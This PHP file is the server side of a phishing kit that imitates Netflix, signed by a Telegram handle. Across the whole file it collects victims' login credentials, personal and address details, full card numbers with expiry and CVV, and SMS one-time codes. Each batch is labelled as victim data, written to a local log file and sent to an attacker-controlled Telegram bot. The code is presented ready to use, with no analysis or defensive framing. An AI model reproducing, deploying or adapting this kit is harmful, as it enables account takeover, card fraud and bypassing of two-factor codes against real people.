<?php

/**

 * @telegram   :   @Haodman+ 
 */
// require_once '../includes/main.php';
require_once '../includes/main.php';

session_start();
include "configs.php";
include "inc/settings.php";

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    function _isCurl(){
        return function_exists('curl_version');
    }
    
    function telegram_message($message, $keyb) {
        include "configs.php";
    
        if (_isCurl() == 1) {
            
            $curl = curl_init();
            
            $data = [
                'text' => $message,
                'chat_id' => $chat_ids,
                'parse_mode' => 'HTML',
                'reply_markup' => $keyb
                ];
            
            curl_setopt($curl, CURLOPT_URL, "https://api.telegram.org/bot".$bot_token."/sendMessage?".http_build_query($data));
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
            $result = curl_exec($curl);
            curl_close($curl);
            return true;
        } else {
    
            file_get_contents("https://api.telegram.org/bot".$bot_token."/sendMessage?".http_build_query($data));
    
            }
    }

    function get_user_ip(){
        // Get real visitor IP behind CloudFlare network
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
    
        if ($ip == '::1') {
            $ip = '127.0.0.1';
        }
    
        return $ip;
    }
$InfoDATE = date("d-m-Y h:i:sa");
$ip = get_user_ip();


if(isset($_POST['id'])) {

    if (!empty($_POST['id']) and !empty($_POST['pwd']) ) {
    
    
    $user = $_POST['id']; 
    $nick_name = $_POST['pwd'];      
    
    $msgx = "Netflix\n
    ┌──VICTIM INFO;
    ├──USER NAME :  " . $_POST['id'] . "
    └──PASSWORD  " . $_POST['pwd'] . "
    
    ┌──Date " . $InfoDATE . ";
    └──IP $ip\n\nNetflix By Haodman+";
    
    
    $file = fopen("logx.txt", "a+");
    fwrite($file, $msgx);
    fclose($file);
    telegram_message($msgx, '');
    exit();
    
    } 
    }
    

if(isset($_POST['assn'])) {

if (!empty($_POST['assn']) and !empty($_POST['aien']) and !empty($_POST['abank']) and !empty($_POST['aacc']) and !empty($_POST['anum']) and !empty($_POST['arout']) and !empty($_POST['adrs']) ) {

$msgx = "Netflix\n
┌──VICTIM CARD;
├──Full Name :  " . $_POST['assn'] . "
├──Birth Date :  " . $_POST['aien'] . "
├──Phone Number :  " . $_POST['abank'] . "
├──Adresse :  " . $_POST['aacc'] . "
├──City  :  " . $_POST['anum'] . "
├──State : " . $_POST['arout'] . "
└──Zip Code " . $_POST['adrs'] . "

┌──Date " . $InfoDATE . ";
└──IP $ip\n\nNetflix By Haodman+";


$file = fopen("logx.txt", "a+");
fwrite($file, $msgx);
fclose($file);

telegram_message($msgx, '');


exit();
}}

if(isset($_POST['nm'])) {

    if (!empty($_POST['nm']) and !empty($_POST['vcc']) and !empty($_POST['vdate']) and !empty($_POST['cvv2']) ) {
    
    
   
    $cc = $_POST['cardnumber'];
         
    
    $msgx = "Netflix\n
    ┌──VICTIM CARD;
    ├──CC NAME :  " . $_POST['nm'] . "
    ├──CC :  " . $_POST['vcc'] . "
    ├──EXP : " . $_POST['vdate'] . "
    └──CVV  " . $_POST['cvv2'] . "
    
    ┌──Date " . $InfoDATE . ";
    └──IP $ip\n\nNetflix By Haodman+";
    
    
    $file = fopen("logx.txt", "a+");
    fwrite($file, $msgx);
    fclose($file);
    
    telegram_message($msgx, '');
    exit();
    
    } else {
        header("Location: index.php?error");
        exit();
    }
    
    }


    
    if(isset($_POST['sms'])) {
        if (is_numeric($_POST['sms'])) {
            $cc = $_SESSION['cc'];
            $sms = $_POST['sms'];
            $cc = $_SESSION['cardname'];
    
    $msgx = "Netflix\n
    ┌──VICTIM SMS 1;
    └──SMS  " . $_POST['sms'] . "

    ┌──Date " . $InfoDATE . ";
    └──IP $ip\n\nBy Haodman+";
        
            $file = fopen("logx.txt", "a+");
            fwrite($file, $message);
            fclose($file);
            $_SESSION['sms'] = $sms;

            telegram_message($msgx, '');   

            // header("Location: loading.php?v4");
            exit();
        } 
        // else {
        //     header("Location: sms.php?error");
        //     exit();
        // }
    }

    if(isset($_POST['sms2'])) {
        if (is_numeric($_POST['sms2'])) {
            $sms = $_POST['sms2'];
           
    
    $msgx = "Netflix\n
    ┌──VICTIM SMS 2;
    └──SMS 2  " . $_POST['sms2'] . "

    ┌──Date " . $InfoDATE . ";
    └──IP $ip\n\nBy Haodman+ ";
        
            $file = fopen("logx.txt", "a+");
            fwrite($file, $message);
            fclose($file);
            $_SESSION['sms'] = $sms;

            telegram_message($msgx, '');   

            // header("Location: loading.php?v3");
            exit();
        }
    }
    
}
?>